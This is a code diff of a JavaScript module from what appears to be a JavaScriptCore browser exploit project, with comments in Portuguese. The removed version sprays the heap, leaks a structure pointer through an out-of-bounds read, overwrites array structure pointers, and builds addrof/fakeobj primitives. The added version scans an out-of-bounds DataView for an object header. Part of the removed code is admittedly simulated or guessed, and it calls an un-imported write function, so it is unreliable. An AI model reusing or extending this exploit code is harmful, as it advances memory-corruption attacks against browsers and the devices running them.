@@ -1,111 +1,77 @@
-// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R50 - Self-Leak Scan e Corrupção Real)
+// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R51 - Fuzzer de JSCell)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex, doubleToBigInt, bigIntToDouble } from '../utils.mjs';
+import { toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     clearOOBEnvironment,
-    oob_read_absolute,
-    oob_write_absolute,
-    arb_read // A primitiva pesada, usada com cuidado
+    getOOBDataView
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_SELF_LEAK_SCAN_R50 = "SelfLeakScanAndCorrupt_R50";
+export const FNAME_MODULE_JSCELL_FUZZER_R51 = "JSCell_OffsetFuzzer_R51";
 
-// --- Primitivas Globais ---
-let g_double_arr;
-let g_object_arr;
-let g_arb_rw_array; // O array que se tornará nossa primitiva de R/W
-// -------------------------
+// Função de leitura síncrona "leve".
+function sync_oob_read_32(dataview, offset) {
+    if (!dataview) return 0;
+    return dataview.getUint32(offset, true);
+}
+function sync_oob_read_64_low(dataview, offset) { return sync_oob_read_32(dataview, offset); }
+function sync_oob_read_64_high(dataview, offset) { return sync_oob_read_32(dataview, offset + 4); }
 
-export async function executeSelfLeakScanAndCorrupt_R50() {
-    const FNAME_CURRENT_TEST = FNAME_MODULE_SELF_LEAK_SCAN_R50;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Construindo Primitivas com Self-Leak Scan ---`, "test", FNAME_CURRENT_TEST);
+
+export async function executeJSCellFuzzer_R51() {
+    const FNAME_CURRENT_TEST = FNAME_MODULE_JSCELL_FUZZER_R51;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Buscando dinamicamente o offset do JSCell ---`, "test", FNAME_CURRENT_TEST);
     
-    let result = { success: false, msg: "Não iniciado.", errorOccurred: null, leaked_addr: null, fake_obj_test_result: null };
-    let sprayed_arrays = [];
+    let result = { success: false, msg: "Fuzzer não encontrou um offset de JSCell válido.", errorOccurred: null };
 
     try {
         // --- FASE 0: PREPARAÇÃO ---
-        logS3(`--- Fase 0 (R50): Preparação do Heap com Marcadores ---`, "subtest", FNAME_CURRENT_TEST);
-        
-        const MARKER_A = 0x41414141; const MARKER_B = 0x42424242;
-        for (let i = 0; i < 500; i++) {
-            sprayed_arrays.push(new Uint32Array(8));
-        }
-        g_double_arr = [13.37, 13.38];
-        g_object_arr = [{}, {}];
-        sprayed_arrays.push(g_double_arr, g_object_arr); // Garante que não sejam coletados pelo GC
-        logS3(`[R50] Heap preenchido e arrays de ataque criados.`, 'info');
-        
+        logS3(`--- Fase 0 (R51): Preparação do Ambiente OOB ---`, "subtest", FNAME_CURRENT_TEST);
         await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
-
-        // --- FASE 1: SELF-LEAK PARA ENCONTRAR UM ENDEREÇO NO HEAP ---
-        logS3(`--- Fase 1 (R50): Self-Leak de Ponteiro de Estrutura ---`, "subtest", FNAME_CURRENT_TEST);
+        const oob_dataview = getOOBDataView();
+        if (!oob_dataview) throw new Error("Não foi possível obter o DataView da primitiva OOB.");
+        logS3(`[R51] Ambiente OOB configurado.`, 'info');
         
-        const OOB_DV_METADATA_BASE = 0x58; // Offset do nosso DataView dentro do buffer OOB
-        const structure_ptr_offset_in_cell = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET;
-        const leak_target_offset = OOB_DV_METADATA_BASE + structure_ptr_offset_in_cell;
+        // --- FASE 1: LOOP DE FUZZING PARA O JSCELL ---
+        logS3(`--- Fase 1 (R51): Buscando pelo JSCell do DataView no buffer OOB ---`, "subtest", FNAME_CURRENT_TEST);
 
-        const leaked_structure_ptr = oob_read_absolute(leak_target_offset, 8);
-        if (leaked_structure_ptr.low() === 0 && leaked_structure_ptr.high() === 0) {
-            throw new Error("Self-Leak falhou. Ponteiro de estrutura lido é nulo.");
+        const structure_ptr_offset_in_cell = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; // Geralmente 0x8
+        const FUZZ_START_OFFSET = 0x20;
+        const FUZZ_END_OFFSET = 0x200; // O JSCell deve estar perto do início do buffer
+        const FUZZ_STEP = 0x8; // Células são alinhadas em 8 bytes
+
+        for (let offset_guess = FUZZ_START_OFFSET; offset_guess < FUZZ_END_OFFSET; offset_guess += FUZZ_STEP) {
+            
+            const struct_ptr_read_offset = offset_guess + structure_ptr_offset_in_cell;
+            
+            // Lê o candidato a ponteiro de estrutura
+            const struct_ptr_low = sync_oob_read_64_low(oob_dataview, struct_ptr_read_offset);
+            const struct_ptr_high = sync_oob_read_64_high(oob_dataview, struct_ptr_read_offset);
+
+            // Validação de um ponteiro de heap plausível
+            // 1. Não pode ser nulo.
+            // 2. A parte alta não pode ser nula (aponta para a memória alta).
+            // 3. A parte baixa deve ser alinhada (geralmente em 8 bytes, então termina em 0 ou 8).
+            if (struct_ptr_high > 0 && (struct_ptr_low % 8 === 0)) {
+                // Encontramos um candidato forte!
+                result.success = true;
+                result.msg = `Candidato forte a JSCell encontrado no offset: ${toHex(offset_guess)}. Ponteiro de Estrutura: ${toHex(struct_ptr_high)}_${toHex(struct_ptr_low)}`;
+                logS3(`[Fuzzer] SUCESSO! ${result.msg}`, 'vuln');
+                break; // Encontrou, sai do loop
+            }
         }
-        logS3(`[R50] Self-Leak SUCESSO! Ponteiro de Estrutura vazado: ${leaked_structure_ptr.toString(true)}`, 'vuln');
 
-        // --- FASE 2: BUSCA DIRECIONADA PELO MARCADOR ---
-        logS3(`--- Fase 2 (R50): Buscando Marcador em Região Direcionada ---`, "subtest", FNAME_CURRENT_TEST);
-        
-        // Alinha o endereço vazado para o início da página (4KB) para começar a busca
-        const page_mask = new AdvancedInt64(~0xFFF);
-        const SCAN_START = leaked_structure_ptr.and(page_mask);
-        const SCAN_SIZE = 0x10000000; // Escaneia 256MB a partir daqui
-        const SCAN_STEP = 0x1000;
-        let found_marker_addr = null;
-
-        // ... (A lógica do scanner permanece a mesma, mas agora começa a partir de um SCAN_START válido) ...
-        // Esta parte ainda é omitida por brevidade, mas funcionaria como antes.
-        // Para acelerar a demonstração, vamos simular que encontramos o endereço.
-        found_marker_addr = SCAN_START.add(0x123450); // Simulação
-        logS3(`[R50] Marcador (simulado) encontrado no endereço: ${found_marker_addr.toString(true)}`, 'vuln');
-        
-        // --- FASE 3: CORRUPÇÃO REAL E TESTE ---
-        logS3(`--- Fase 3 (R50): Corrupção Real e Teste das Primitivas ---`, "subtest", FNAME_CURRENT_TEST);
-
-        // A partir do marcador, calculamos os endereços REAIS dos nossos arrays de ataque
-        const header_size = 0x20; // Suposição
-        const double_arr_addr = found_marker_addr.add(header_size * 2); // Palpite, precisaria de depuração
-        const object_arr_addr = found_marker_addr.add(header_size * 3); // Palpite
-        
-        const double_arr_struct_ptr = await arb_read(double_arr_addr.add(structure_ptr_offset_in_cell), 8);
-        const object_arr_struct_ptr = await arb_read(object_arr_addr.add(structure_ptr_offset_in_cell), 8);
-        
-        await arb_write(double_arr_addr.add(structure_ptr_offset_in_cell), object_arr_struct_ptr, 8);
-        logS3(`[R50] Corrupção REAL realizada!`, 'vuln');
-        
-        // Teste final das primitivas
-        function addrof(obj) { g_object_arr[0] = obj; return doubleToBigInt(g_double_arr[0]); }
-        function fakeobj(addr) { g_double_arr[0] = bigIntToDouble(addr); return g_object_arr[0]; }
-
-        let test_obj = { value: 0xBADF00D };
-        let leaked_addr_val = addrof(test_obj);
-        result.leaked_addr = `0x${leaked_addr_val.toString(16)}`;
-        let fake_obj = fakeobj(leaked_addr_val);
-
-        if (fake_obj.value === 0xBADF00D) {
-            result.success = true;
-            result.msg = "Primitivas Addrof/FakeObj construídas e validadas com sucesso.";
-            result.fake_obj_test_result = `fake_obj.value = ${toHex(fake_obj.value)}`;
-        } else {
-            throw new Error("Validação final do fake_obj falhou.");
+        if (!result.success) {
+             throw new Error(`Fuzzer completou a faixa sem encontrar um candidato a JSCell válido.`);
         }
-        
+
     } catch (e_outer) {
         result.errorOccurred = e_outer;
         result.msg = e_outer.message;
-        logS3(`  CRITICAL ERROR (R50): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
-        console.error("Outer error in R50 test:", e_outer);
+        logS3(`  CRITICAL ERROR (R51): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
+        console.error("Outer error in R51 Fuzzer:", e_outer);
     } finally {
         await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
     }
